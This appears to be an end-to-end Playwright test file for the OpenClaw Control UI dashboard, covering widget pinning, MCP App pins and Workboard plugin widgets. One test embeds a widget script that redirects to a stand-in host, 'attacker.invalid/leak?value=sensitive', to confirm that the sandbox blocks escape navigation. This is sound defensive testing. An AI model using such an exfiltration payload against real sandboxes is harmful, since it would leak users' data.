import { once } from "node:events";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { WORKBOARD_STATUSES, type WorkboardCard } from "@openclaw/workboard-contract";
import type { Locator, Page } from "playwright";
import { expect, it } from "vitest";
import { GATEWAY_SERVER_CAPS } from "../../../packages/gateway-protocol/src/index.js";
import { SANDBOX_HOST_PATH } from "../../../src/agents/sandbox-host.js";
import { buildWidgetDocument } from "../../../src/canvas/wrap.js";
import { createSandboxHostHttpServer } from "../../../src/gateway/mcp-app-sandbox-http.js";
import { selectChatLayoutAction } from "../test-helpers/chat-layout-menu.ts";
import { installControlUiE2eRendererStallProbe } from "../test-helpers/control-ui-e2e-renderer-stall.ts";
import { takeControlUiViewportScreenshot } from "../test-helpers/control-ui-e2e-screenshot.ts";
import {
  controlUiBundledSettingsStorageKey,
  controlUiSessionUrl,
  installMockGateway,
  type ControlUiMockGatewayScenario,
  type MockGatewayControls,
} from "../test-helpers/control-ui-e2e.ts";
import { workboardUi } from "../test-helpers/control-ui-workboard-fixture.ts";
import { useCanvasSandboxFixture } from "./canvas-sandbox.test-support.ts";
import {
  dockChatSidePanel,
  focusChatSidePanel,
  restoreChatAsMain,
} from "./chat-side-panel.test-support.ts";
import { createControlUiE2eSuite } from "./control-ui-e2e-suite.test-support.ts";
import { assertDashboardToolPresentation } from "./dashboard-presentation.test-support.ts";
import {
  boardSnapshot,
  captureWidgetDetailsPlacement,
  pinnedBoardSnapshot,
  pinnedMcpAppBoardSnapshot,
  pluginWidgetBoardSnapshot,
  sessionKey,
} from "./session-dashboard.test-support.ts";

const suite = createControlUiE2eSuite({
  name: "Control UI session dashboard stitch",
  startServerBeforeBrowser: true,
  trackBrowserContexts: true,
});

async function showDashboard(page: Page): Promise<void> {
  // Every scenario starts in a fresh browser context; no saved views need merging.
  await page.addInitScript(
    ({ key, storageKey }) => {
      localStorage.setItem(
        storageKey,
        JSON.stringify({ boardSessionViews: { [key]: { activeTabId: "main" } } }),
      );
    },
    { key: sessionKey, storageKey: controlUiBundledSettingsStorageKey(suite.server.baseUrl) },
  );
}

async function createProofContext(name: string) {
  const recordProof = process.env.OPENCLAW_UI_E2E_RECORD === "1";
  const proofDir = recordProof ? path.join(suite.artifactDir, name) : undefined;
  if (proofDir) {
    await mkdir(proofDir, { recursive: true });
  }
  const viewport = { height: 900, width: 1280 };
  const context = await suite.newBrowserContext({
    viewport,
    ...(proofDir ? { recordVideo: { dir: proofDir, size: viewport } } : {}),
  });
  // Preserve the raw context's existing action timeout.
  context.setDefaultTimeout(30_000);
  const page = await context.newPage();
  await installControlUiE2eRendererStallProbe(page);
  return {
    page,
    recordProof,
    capture: async (file: string) => {
      if (proofDir) {
        await page.screenshot({ path: path.join(proofDir, file) });
      }
    },
    close: async (saveVideo = false) => {
      const video = page.video();
      await suite.closeBrowserContext(context);
      if (saveVideo && proofDir && video) {
        await video.saveAs(path.join(proofDir, `${name}.webm`));
      }
    },
  };
}

async function setupDashboard(page: Page, scenario: ControlUiMockGatewayScenario) {
  const gateway = await installMockGateway(page, {
    ...scenario,
    sessionKey,
    featureMethods: [
      "board.get",
      "chat.metadata",
      "chat.startup",
      ...(scenario.featureMethods ?? []),
    ],
    methodResponses: { "board.get": boardSnapshot, ...scenario.methodResponses },
  });
  await showDashboard(page);
  return gateway;
}
const widgetKinds = [
  { pluginId: "workboard", kind: "workboard:card", label: "Workboard card" },
  { pluginId: "workboard", kind: "workboard:mini", label: "Workboard summary" },
];
const assistantHistory = (content: unknown[]) => [{ role: "assistant", content, timestamp: 1 }];
const canvasHistory = (preview: Record<string, unknown>) =>
  assistantHistory([
    {
      type: "canvas",
      preview: { kind: "canvas", surface: "assistant_message", render: "url", ...preview },
    },
  ]);
const canvasDocumentHistory = (title: string, viewId: string) =>
  canvasHistory({
    title,
    viewId,
    url: `/__openclaw__/canvas/documents/${viewId}/index.html`,
    preferredHeight: 240,
    sandbox: "scripts",
  });
const makeCard = (overrides: Partial<WorkboardCard>): WorkboardCard => ({
  id: "card-widget-ready",
  title: "Rebase plugin widget kinds",
  status: "ready",
  priority: "high",
  labels: ["dashboard"],
  position: 1_000,
  createdAt: 1,
  updatedAt: 2,
  agentId: "main",
  metadata: { automation: { boardId: "platform" } },
  ...overrides,
});
const expectStyle = (
  locator: Locator,
  property: "opacity" | "padding" | "borderTopWidth",
  value: string,
) =>
  expect
    .poll(() => locator.evaluate((element, key) => getComputedStyle(element)[key], property))
    .toBe(value);
const expectElement = (
  locator: Locator,
  predicate: (element: HTMLElement | SVGElement) => boolean,
) => expect.poll(() => locator.evaluate(predicate)).toBe(true);
const openDashboard = (page: Page) =>
  page.goto(controlUiSessionUrl(suite.server.baseUrl, sessionKey, "dashboard"));
const expectBoardLink = async (link: Locator) =>
  expect(new URL((await link.getAttribute("href"))!, suite.server.baseUrl).pathname).toBe(
    "/workboard/platform",
  );

async function expectPinned(
  gateway: MockGatewayControls,
  preview: Locator,
  expected: { name: string; title: string; content: Record<string, string> },
) {
  await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
  expect((await gateway.getRequests("board.widget.put"))[0]?.params).toEqual({
    sessionKey,
    agentId: "main",
    ...expected,
  });
  await expect.poll(() => preview.getByRole("button", { name: "Pinned" }).isDisabled()).toBe(true);
}

async function updateCards(
  gateway: MockGatewayControls,
  cards: WorkboardCard[],
  epoch: string,
  revision = 2,
) {
  await gateway.setMethodResponse("workboard.cards.list", workboardCardsListResponse(cards));
  await gateway.emitGatewayEvent("plugin.workboard.changed", { epoch, revision });
}

function workboardConfigSnapshot(enabled = true) {
  const config = { plugins: { entries: { workboard: { enabled } } } };
  return {
    config,
    hash: "workboard-cardboard-e2e",
    path: "/tmp/openclaw-e2e/openclaw.json",
    raw: JSON.stringify(config),
    resolved: config,
    sourceConfig: config,
  };
}

function workboardCardsListResponse(cards: WorkboardCard[]) {
  return {
    cards,
    boards: [
      { id: "platform", total: cards.length, active: cards.length, archived: 0, byStatus: {} },
    ],
    statuses: WORKBOARD_STATUSES,
  };
}

suite.define(() => {
  const canvasView = useCanvasSandboxFixture();
  it("keeps widget documents in standards mode and cancels self-navigation", async () => {
    const sandboxHost = createSandboxHostHttpServer();
    sandboxHost.listen(0, "127.0.0.1");
    await once(sandboxHost, "listening");
    const sandboxAddress = sandboxHost.address();
    if (!sandboxAddress || typeof sandboxAddress === "string") {
      throw new Error("sandbox host did not bind a TCP address");
    }
    const context = await suite.browser.newContext();
    try {
      const page = await context.newPage();
      const escapeRequests: string[] = [];
      page.on("request", (request) => {
        if (request.url().startsWith("https://attacker.invalid/")) {
          escapeRequests.push(request.url());
        }
      });
      await page.goto(suite.server.baseUrl);
      await page.evaluate((sandboxUrl) => {
        Reflect.set(globalThis, "widgetProbes", []);
        addEventListener("message", (event) => {
          (Reflect.get(globalThis, "widgetProbes") as unknown[]).push(event.data);
        });
        const frame = document.createElement("iframe");
        frame.src = sandboxUrl;
        document.body.replaceChildren(frame);
      }, `http://127.0.0.1:${sandboxAddress.port}${SANDBOX_HOST_PATH}`);
      const probes = () =>
        page.evaluate(
          () =>
            Reflect.get(globalThis, "widgetProbes") as Array<{
              method?: string;
              compatMode?: string;
            }>,
        );
      await expect
        .poll(async () =>
          (await probes()).some(
            (probe) => probe?.method === "ui/notifications/sandbox-proxy-ready",
          ),
        )
        .toBe(true);

      const widgetHtml = `<!doctype html><html><body><script>
        parent.postMessage({
          compatMode: document.compatMode,
        }, "*");
        setTimeout(() => {
          location.href = "https://attacker.invalid/leak?value=sensitive";
        }, 0);
      </script></body></html>`;
      await page.locator("iframe").evaluate((frame, html) => {
        (frame as HTMLIFrameElement).contentWindow?.postMessage(
          {
            method: "ui/notifications/sandbox-resource-ready",
            params: { html },
          },
          "*",
        );
      }, widgetHtml);
      await expect
        .poll(async () => (await probes()).filter((probe) => probe?.compatMode))
        .toEqual([{ compatMode: "CSS1Compat" }]);
      const sandboxFrame = await page
        .locator("iframe")
        .elementHandle()
        .then((handle) => handle?.contentFrame());
      const widgetFrame = sandboxFrame?.childFrames()[0];
      expect(widgetFrame).toBeDefined();
      await page.waitForTimeout(250);
      expect(widgetFrame!.url()).not.toContain("attacker.invalid");
      expect(escapeRequests).toEqual([]);
    } finally {
      await context.close();
      await new Promise<void>((resolve, reject) => {
        sandboxHost.close((error) => (error ? reject(error) : resolve()));
      });
    }
  });

  it("pins Canvas HTML, follows board commands, and switches dashboard panel width", async () => {
    const { page, recordProof, capture, close } = await createProofContext("workboard-pin");
    const gateway = await setupDashboard(page, {
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: ["board.update", "board.widget.grant", "board.widget.put"],
      historyMessages: canvasDocumentHistory("Release status", "cv_release"),
      methodResponses: {
        "canvas.document.view": canvasView(
          buildWidgetDocument("Release status", "<p>Release status</p>"),
        ),
        "board.widget.put": pinnedBoardSnapshot,
      },
    });
    await openDashboard(page);
    await expect
      .poll(async () => (await gateway.getRequests("board.get")).length, { timeout: 30_000 })
      .toBeGreaterThan(0);
    await page.locator('[data-panel-slot="dashboard"]').waitFor();
    await page.locator(".board-session-surface").waitFor();
    await page.locator(".chat-thread").waitFor();
    await capture("03-direct-route.png");

    await dockChatSidePanel(page, "bottom");
    await expect.poll(() => page.locator(".sidebar-region--bottom").count()).toBe(1);
    await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(true);
    await capture("04-bottom-dock.png");

    await page.setViewportSize({ width: 1440, height: 900 });
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const previewBubble = page.locator(".chat-bubble", { has: preview });
    const widgetActions = preview.locator("[data-widget-actions]");
    await expect.poll(() => preview.locator(".chat-tool-card__preview-header").count()).toBe(0);
    await expectStyle(preview.locator(".chat-tool-card__preview-panel"), "padding", "0px");
    await page.mouse.move(0, 0);
    await expectStyle(widgetActions, "opacity", "0");
    const restingBox = (await preview.boundingBox())!;
    const pin = preview.getByRole("button", { name: "Pin to dashboard" });
    const more = preview.getByRole("button", { name: "Widget actions", exact: true });
    await pin.focus();
    await pin.hover();
    // Hover keeps the toolbar visible after keyboard focus leaves it.
    await page.locator(".agent-chat__composer-combobox textarea").focus();
    await expectStyle(widgetActions, "opacity", "1");
    const geometry = await preview.evaluate((element) => {
      const box = element.getBoundingClientRect();
      const pinBox = element.querySelector("[data-pin-widget]")!.getBoundingClientRect();
      const moreBox = element
        .querySelector(".chat-tool-card__widget-actions-trigger")!
        .getBoundingClientRect();
      const panelBox = element
        .querySelector(".chat-tool-card__preview-panel")!
        .getBoundingClientRect();
      return {
        gap: pinBox.left - box.right,
        actionLeftOffset: moreBox.left - pinBox.left,
        actionVerticalGap: moreBox.top - pinBox.bottom,
        top: pinBox.top - box.top,
        box: { x: box.x, y: box.y, width: box.width, height: box.height },
        panelWidth: panelBox.width,
      };
    });
    expect(geometry.gap).toBeGreaterThan(0);
    expect(geometry.actionVerticalGap).toBeGreaterThan(0);
    expect(geometry).toMatchObject({
      top: 0,
      actionLeftOffset: 0,
      box: restingBox,
      panelWidth: restingBox.width,
    });
    const pinBox = (await pin.boundingBox())!;
    await page.mouse.move(pinBox.x - geometry.gap / 2, pinBox.y + pinBox.height / 2);
    await page.mouse.move(pinBox.x + pinBox.width / 2, pinBox.y + pinBox.height / 2);
    await expectStyle(widgetActions, "opacity", "1");
    await page.mouse.move(0, 0);
    await pin.focus();
    await page.keyboard.press("Tab");
    await expectElement(more, (element) => element.matches(":focus-visible"));
    await expectStyle(widgetActions, "opacity", "1");
    await page.keyboard.press("Enter");
    await expect.poll(() => preview.locator(".oc-menu:popover-open").count()).toBe(1);
    await page.keyboard.press("Escape");
    const conversation = page.locator(".sidebar-region__primary", { has: preview });
    for (const width of [796, 794, 390, 1440]) {
      await page.setViewportSize({ width, height: 900 });
      await expect.poll(() => conversation.count()).toBe(1);
      if (width !== 1440) {
        // Narrow layouts retain the conversation but present the dashboard instead.
        await expect.poll(() => conversation.isVisible()).toBe(false);
        await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(true);
        continue;
      }
      await expect.poll(() => conversation.isVisible()).toBe(true);
      await expectElement(preview, (element) => {
        const box = element.getBoundingClientRect();
        const actions = element.querySelector("[data-widget-actions]")!.getBoundingClientRect();
        const pinBounds = element.querySelector("[data-pin-widget]")!.getBoundingClientRect();
        const thread = element.closest(".chat-thread")!;
        const threadBox = thread.getBoundingClientRect();
        if (
          [box, actions, pinBounds, threadBox].some(
            ({ width: rectWidth, height }) => rectWidth <= 0 || height <= 0,
          )
        ) {
          return false;
        }
        const edge = threadBox.left + thread.clientLeft + thread.clientWidth;
        return edge - box.right >= 40
          ? actions.left >= box.right && actions.right <= edge && actions.top === box.top
          : actions.right <= box.right && actions.bottom === box.top;
      });
    }
    await pin.focus();
    await pin.hover();
    await expectStyle(preview.locator(".chat-tool-card__preview-frame"), "borderTopWidth", "0px");
    if (recordProof) {
      await widgetActions.hover();
      await expectStyle(widgetActions, "opacity", "1");
      await writeFile(
        path.join(suite.artifactDir, "workboard-pin", "01-pin-hover.png"),
        await takeControlUiViewportScreenshot(page, previewBubble, [preview]),
      );
    }
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();
    await expectPinned(gateway, preview, {
      name: "canvas-cv_release",
      title: "Release status",
      content: { kind: "canvas-doc", docId: "cv_release" },
    });
    if (recordProof) {
      await writeFile(
        path.join(suite.artifactDir, "workboard-pin", "02-pinned.png"),
        await takeControlUiViewportScreenshot(page, previewBubble, [preview]),
      );
    }
    await gateway.setMethodResponse("board.get", pinnedBoardSnapshot);

    await gateway.emitGatewayEvent("board.command", {
      sessionKey,
      command: { kind: "focus_tab", tabId: "research" },
    });
    const researchTab = page.locator('[data-board-tab-id="research"]');
    await expect.poll(() => researchTab.getAttribute("active")).not.toBeNull();

    await assertDashboardToolPresentation({
      page,
      gateway,
      sessionKey,
      proofDir: recordProof ? path.join(suite.artifactDir, "workboard-pin") : undefined,
    });

    await restoreChatAsMain(page);
    await focusChatSidePanel(page);
    await expect.poll(() => page.locator(".sidebar-region--expanded").count()).toBe(1);
    await selectChatLayoutAction(page, "Restore split");
    await expect.poll(() => page.locator(".sidebar-region--expanded").count()).toBe(0);
    await expect.poll(() => page.locator(".sidebar-region--bottom").count()).toBe(1);
    await expect
      .poll(() =>
        page.locator('.chat-tool-card__preview[data-kind="canvas"] [data-pin-widget]').isDisabled(),
      )
      .toBe(true);
    await capture("05-collapsed-bottom.png");
    await restoreChatAsMain(page);
    await selectChatLayoutAction(page, "Minimize side panel");
    await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(false);
    await page.locator(".chat-thread").waitFor();
    await capture("06-chat-only.png");
    await close();
  });

  it("shows a bounded visible outcome when a Canvas dashboard pin fails", async () => {
    const { page, capture, close } = await createProofContext("workboard-pin-failure");
    const gateway = await setupDashboard(page, {
      featureCapabilities: [GATEWAY_SERVER_CAPS.BOARD_WIDGET_PUT_CANVAS_DOC],
      featureMethods: ["board.update", "board.widget.grant", "board.widget.put"],
      historyMessages: canvasDocumentHistory("Stale release status", "cv_stale"),
      methodResponses: {
        // Pin failure does not depend on widget scripting; keep the visible preview deterministic.
        "canvas.document.view": canvasView(
          "<!doctype html><html><body><p>Stale release status</p></body></html>",
        ),
        "board.widget.put": {
          __mockError: {
            code: "NOT_FOUND",
            message: `internal path detail ${"x".repeat(8_000)}`,
          },
        },
      },
    });
    await openDashboard(page);
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    const pin = preview.getByRole("button", { name: "Pin to dashboard" });
    await expectStyle(preview.locator("[data-widget-actions]"), "opacity", "0.6");
    await expectElement(pin, (element) => {
      const box = element.getBoundingClientRect();
      const thread = element.closest(".chat-thread")!.getBoundingClientRect();
      return box.top >= thread.top;
    });
    const detailsToggle = page.getByRole("button", { name: "Details", exact: true });
    await captureWidgetDetailsPlacement(page, suite.artifactDir, [preview, pin, detailsToggle]);
    const detailsBox = (await detailsToggle.boundingBox())!;
    const pinBox = (await pin.boundingBox())!;
    expect(
      pinBox.x + pinBox.width <= detailsBox.x ||
        pinBox.x >= detailsBox.x + detailsBox.width ||
        pinBox.y + pinBox.height <= detailsBox.y ||
        pinBox.y >= detailsBox.y + detailsBox.height,
    ).toBe(true);
    await pin.focus();
    expect(
      await pin.evaluate((element) => {
        const box = element.getBoundingClientRect();
        return element.contains(
          document.elementFromPoint(box.x + box.width / 2, box.y + box.height / 2),
        );
      }),
    ).toBe(true);
    await pin.click();

    await expect.poll(async () => (await gateway.getRequests("board.widget.put")).length).toBe(1);
    const toast = page.locator("openclaw-toast-host .app-toast");
    await toast.waitFor();
    expect(await toast.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await pin.isEnabled()).toBe(true);
    await page.mouse.move(0, 0);
    await pin.focus();
    await pin.hover();
    const hint = page.locator(".tooltip-surface[popover]:popover-open");
    await hint.locator(".tooltip-content").waitFor({ state: "visible" });
    expect(await hint.textContent()).toContain("Could not pin to dashboard. Try again.");
    expect(await page.getByText("internal path detail", { exact: false }).count()).toBe(0);
    await capture("pin-failed.png");
    await close();
  });

  it("pins an inline MCP App using only its session-bound view identity", async () => {
    const context = await suite.browser.newContext({ viewport: { height: 900, width: 1280 } });
    const page = await context.newPage();
    const gateway = await setupDashboard(page, {
      featureCapabilities: [],
      featureMethods: ["board.widget.appView", "board.widget.put"],
      historyMessages: canvasHistory({
        title: "Demo App",
        viewId: "outer-view-must-not-be-pinned",
        mcpApp: {
          viewId: "view-session-bound",
          serverName: "forbidden-server",
          toolName: "forbidden-tool",
          uiResourceUri: "ui://forbidden/app.html",
          originSessionKey: sessionKey,
          toolCallId: "forbidden-call",
        },
      }),
      methodResponses: {
        "board.widget.appView": {
          viewId: "view-pinned-lease",
          expiresAtMs: Date.now() + 60_000,
        },
        "board.widget.put": pinnedMcpAppBoardSnapshot,
      },
    });
    await openDashboard(page);
    await page.locator(".board-session-surface").waitFor();
    const preview = page.locator('.chat-tool-card__preview[data-kind="canvas"]');
    await preview.hover();
    await preview.getByRole("button", { name: "Pin to dashboard" }).click();

    await expectPinned(gateway, preview, {
      name: "mcp-app-28b65635ecaa78ac",
      title: "Demo App",
      content: { kind: "mcp-app", viewId: "view-session-bound" },
    });
    await context.close();
  });

  it("renders and updates active Workboard plugin widgets", async () => {
    const { page, capture, close } = await createProofContext("workboard-plugin-widgets");
    const readyCard = makeCard({ sessionKey });
    const refreshedCard = {
      ...readyCard,
      title: "Refreshed while the dashboard is hidden",
      updatedAt: 3,
    };
    const runningCard: WorkboardCard = {
      ...refreshedCard,
      status: "running",
      position: 2_000,
      updatedAt: 4,
    };
    const alreadyRunningCard: WorkboardCard = {
      ...readyCard,
      id: "card-widget-running",
      title: "Already running",
      sessionKey: undefined,
      status: "running",
    };
    const gateway = await setupDashboard(page, {
      ...workboardUi,
      controlUiWidgetKinds: widgetKinds,
      featureMethods: ["sessions.patch", "workboard.cards.list", "workboard.cards.move"],
      methodResponses: {
        "board.get": pluginWidgetBoardSnapshot,
        "workboard.cards.list": workboardCardsListResponse([readyCard, alreadyRunningCard]),
        "workboard.cards.move": { card: runningCard },
      },
    });
    try {
      await openDashboard(page);
      const cardWidget = page.locator('[data-test-id="workboard-card-widget"]');
      const miniWidget = page.locator('[data-test-id="workboard-mini-widget"]');
      await cardWidget.waitFor();
      await miniWidget.waitFor();
      await expect.poll(() => cardWidget.textContent()).toContain("Rebase plugin widget kinds");
      await expect.poll(() => miniWidget.textContent()).toContain("Already running");
      const accessory = page.locator(".workboard-session-chip");
      await expect.poll(() => accessory.textContent()).toContain(readyCard.title);
      await expectBoardLink(miniWidget.getByRole("link", { name: "Open board" }));
      await capture("01-plugin-widgets-ready.png");

      const nativeCardView = page.locator("openclaw-plugin-view").filter({ has: cardWidget });
      const cardElement = await nativeCardView.elementHandle();
      expect(cardElement).not.toBeNull();
      await cardElement?.evaluate((element) => {
        Reflect.set(globalThis, "workboardPluginElementIdentity", element);
      });
      const expectRetainedCardView = async (presented: boolean) => {
        await expect
          .poll(() =>
            nativeCardView.evaluate(
              (element, visible) =>
                element === Reflect.get(globalThis, "workboardPluginElementIdentity") &&
                element.isConnected &&
                Reflect.get(element, "presented") === visible,
              presented,
            ),
          )
          .toBe(true);
      };
      await focusChatSidePanel(page);
      await expectRetainedCardView(true);
      await selectChatLayoutAction(page, "Restore split");
      await restoreChatAsMain(page);
      const listCountBeforeHide = (await gateway.getRequests("workboard.cards.list")).length;
      await selectChatLayoutAction(page, "Minimize side panel");
      await expect.poll(() => page.locator(".board-session-surface").isVisible()).toBe(false);
      await expectRetainedCardView(false);
      await updateCards(gateway, [refreshedCard, alreadyRunningCard], "plugin-widget-e2e-hidden");
      await expect.poll(() => accessory.textContent()).toContain(refreshedCard.title);
      await page.evaluate(
        () =>
          new Promise<void>((resolve) => {
            requestAnimationFrame(() => requestAnimationFrame(() => resolve()));
          }),
      );
      // The visible chat header refreshes its catalog; retained dashboard widgets stay paused.
      expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(
        listCountBeforeHide + 1,
      );
      expect(await cardWidget.count()).toBe(1);

      await gateway.emitGatewayEvent("board.command", {
        sessionKey,
        command: { kind: "focus_tab", tabId: "main" },
      });
      // Both resumed widget views share one read; the visible header keeps its current lookup.
      await expect
        .poll(async () => (await gateway.getRequests("workboard.cards.list")).length)
        .toBe(listCountBeforeHide + 2);
      await expect.poll(() => cardWidget.textContent()).toContain(refreshedCard.title);
      await expect.poll(() => accessory.textContent()).toContain(refreshedCard.title);
      await expectRetainedCardView(true);

      await cardWidget.getByRole("combobox").selectOption("running");
      const moveRequest = await gateway.waitForRequest("workboard.cards.move");
      expect(moveRequest.params).toEqual({
        id: "card-widget-ready",
        status: "running",
        position: 2_000,
      });
      await expect.poll(() => cardWidget.textContent()).toContain("Running");
      await updateCards(gateway, [runningCard, alreadyRunningCard], "plugin-widget-e2e");
      await expect
        .poll(async () =>
          (await miniWidget.locator('[title="Running"]').textContent())
            ?.replace(/\s+/gu, " ")
            .trim(),
        )
        .toBe("2 Running");
      await capture("02-plugin-widgets-running.png");
    } finally {
      await close(true);
    }
  });

  it("keeps a read-only Workboard dashboard card visible without allowing status changes", async () => {
    await suite.withPage({ viewport: { height: 900, width: 1280 } }, async ({ page }) => {
      const card = makeCard({ title: "Read-only dashboard card" });
      const gateway = await setupDashboard(page, {
        ...workboardUi,
        controlUiWidgetKinds: widgetKinds,
        featureMethods: ["workboard.cards.list", "workboard.cards.move"],
        operatorScopes: ["operator.read"],
        methodResponses: {
          "board.get": pluginWidgetBoardSnapshot,
          "workboard.cards.list": workboardCardsListResponse([card]),
        },
      });
      await openDashboard(page);
      const cardWidget = page.locator('[data-test-id="workboard-card-widget"]');
      await cardWidget.waitFor();
      await expect.poll(() => cardWidget.textContent()).toContain(card.title);
      const status = cardWidget.getByRole("combobox");
      await expect.poll(() => status.isDisabled()).toBe(true);
      await status.evaluate((select) => {
        (select as HTMLSelectElement).value = "running";
        select.dispatchEvent(new Event("change", { bubbles: true }));
      });
      expect(await gateway.getRequests("workboard.cards.move")).toHaveLength(0);
    });
  });

  it("links a dispatched Workboard card and its live session dashboard in both directions", async () => {
    const { page, capture, close } = await createProofContext("workboard-cardboard");
    const card = makeCard({
      id: "card-dashboard-stitch",
      title: "Ship dashboard stitch",
      status: "running",
      agentId: undefined,
      sessionKey,
      runId: "run-dashboard-stitch",
    });
    const gateway = await setupDashboard(page, {
      ...workboardUi,
      featureMethods: ["config.get", "sessions.list", "workboard.cards.list"],
      methodResponses: {
        "config.get": workboardConfigSnapshot(),
        "workboard.cards.list": workboardCardsListResponse([card]),
      },
    });
    const setHistory = (text: string) =>
      gateway.setMethodResponse("chat.history", {
        messages: [{ role: "assistant", content: [{ type: "text", text }] }],
      });
    try {
      await openDashboard(page);
      const chip = page.locator(".workboard-session-chip");
      await chip.waitFor();
      await expect.poll(() => chip.textContent()).toContain("Ship dashboard stitch");
      await expect.poll(() => chip.textContent()).toContain("Running");
      await expectBoardLink(chip);
      await capture("01-dashboard-card-chip.png");

      const completedCard: WorkboardCard = { ...card, status: "done", updatedAt: 3 };
      await updateCards(gateway, [completedCard], "cardboard-e2e");
      await expect.poll(() => chip.textContent()).toContain("Done");

      await updateCards(gateway, [], "cardboard-e2e", 3);
      await expect.poll(() => chip.count()).toBe(0);

      await updateCards(gateway, [completedCard], "cardboard-e2e", 4);
      await chip.waitFor();

      await chip.click();
      await page.waitForURL((url) => url.pathname === "/workboard/platform");
      const workboardCard = page.locator(".workboard-card", {
        hasText: "Ship dashboard stitch",
      });
      await workboardCard.waitFor();
      await workboardCard.click();
      await setHistory("Dashboard stitch progress");
      await page.getByRole("tab", { name: "Session", exact: true }).click();
      const cardSummary = page.locator("openclaw-plugin-session-summary");
      await cardSummary.getByText("Dashboard stitch progress", { exact: true }).waitFor();
      expect((await gateway.getRequests("chat.history")).at(-1)?.params).toMatchObject({
        sessionKey,
      });
      await capture("02-workboard-card-dashboard.png");

      await setHistory("Dashboard stitch complete");
      await gateway.emitGatewayEvent("session.message", { sessionKey });
      await cardSummary.getByText("Dashboard stitch complete", { exact: true }).waitFor();
      expect(
        await cardSummary.getByText("Dashboard stitch progress", { exact: true }).count(),
      ).toBe(0);
    } finally {
      await close(true);
    }
  });

  it("links Workboard cards without dashboard widgets and omits the disabled plugin", async () => {
    for (const native of [false, true]) {
      const name = native ? "board empty" : "plugin disabled";
      await suite.withPage({ viewport: { height: 900, width: 1280 } }, async ({ page }) => {
        const gateway = await setupDashboard(page, {
          ...(native ? workboardUi : {}),
          featureMethods: ["config.get", "workboard.cards.list"],
          methodResponses: {
            "board.get": native
              ? { sessionKey, revision: 1, tabs: [], widgets: [] }
              : boardSnapshot,
            "config.get": workboardConfigSnapshot(native),
            "workboard.cards.list": workboardCardsListResponse([
              makeCard({
                id: `card-${name.replaceAll(" ", "-")}`,
                title: name,
                status: "running",
                sessionKey,
                agentId: undefined,
              }),
            ]),
          },
        });
        await openDashboard(page);
        await expect
          .poll(async () => (await gateway.getRequests("board.get")).length)
          .toBeGreaterThan(0);
        const chip = page.locator(".workboard-session-chip");
        if (native) {
          await expect.poll(() => chip.textContent()).toContain(name);
          await expectBoardLink(chip);
          expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(1);
        } else {
          await expect.poll(() => chip.count()).toBe(0);
          expect(await gateway.getRequests("workboard.cards.list")).toHaveLength(0);
        }
      });
    }
  });
});
